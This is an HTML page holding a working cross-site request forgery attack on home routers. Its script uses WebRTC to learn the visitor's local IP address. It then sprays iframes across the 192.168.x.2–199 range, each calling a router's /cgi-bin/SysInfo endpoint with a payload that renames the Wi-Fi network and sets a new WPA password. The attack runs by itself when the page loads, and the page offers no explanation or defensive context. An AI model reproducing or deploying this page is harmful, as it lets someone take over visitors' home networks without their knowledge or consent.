<html>
<head>
    <title>What a NEET CSRF</title>
</head>
    <body>
    <script>
function findIP(onNewIP) { //  onNewIp - your listener function for new IPs
    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; // compatibility for firefox and chrome
    var pc = new myPeerConnection({iceServers: []}),
	noop = function() {},
        localIPs = {},
        ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
        key;
    function ipIterate(ip) {
        if (!localIPs[ip]) onNewIP(ip);
        localIPs[ip] = true;
    }
    pc.createDataChannel(""); //create a bogus data channel
    pc.createOffer(function(sdp) {
        sdp.sdp.split('\n').forEach(function(line) {
            if (line.indexOf('candidate') < 0) return;
            line.match(ipRegex).forEach(ipIterate);
        });
        pc.setLocalDescription(sdp, noop, noop);
    }, noop); // create offer and set local description
    pc.onicecandidate = function(ice) { //listen for candidate events
        if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
        ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
    };
};
function hackit(ip) {
    octets=ip.split(".");
    network=octets[0]+"."+octets[1]+"."+octets[2];
	alert(network);
    var i;
	alert(network)
    // we're looking for home networks, so we only search 192.168.0/24 thru 192.168.9/24
    if ( octets[0].match(/192/) && octets[1].match(/168/) ) {
        for (i=2; i < 200 ; i++) {
            ifrm = document.createElement("iframe");
            ifrm.setAttribute('src', 'http://'+network+'.'+i+'/cgi-bin/SysInfo?data=%3CsetSysInfo%3E%3CSSID%20name%3D%22bouncycastle%22%20encrypt%3D%22WPA%22%20channel%3D%22%22%20password%3D%22yoloswag%22%20encrypt_len%3D%22%22%20format%3D%22%22%20mac%3D%22845dd7a1c4a7%22%20tkip_aes%3D%22aes%22/%3E%3C/setSysInfo%3E&ts=1470931846464&data=%3CsetSysInfo%3E%3CSSID+name%3D%22 bouncycastle%22+encrypt%3D%22WPA%22+channel%3D%22%22+password%3D%22yoloswag%22+encrypt_len%3D%22%22+format%3D%22%22+mac%3D%22845dd7a1c4a7%22+tkip_aes%3D%22aes%22%2F%3E%3C%2FsetSysInfo%3E');
            ifrm.height=200;
            ifrm.width=200;
            document.body.appendChild(ifrm);
        };
    };
};
findIP( hackit );
</script>

Spraying CSRF ...

<br><p>
</body>
</html>
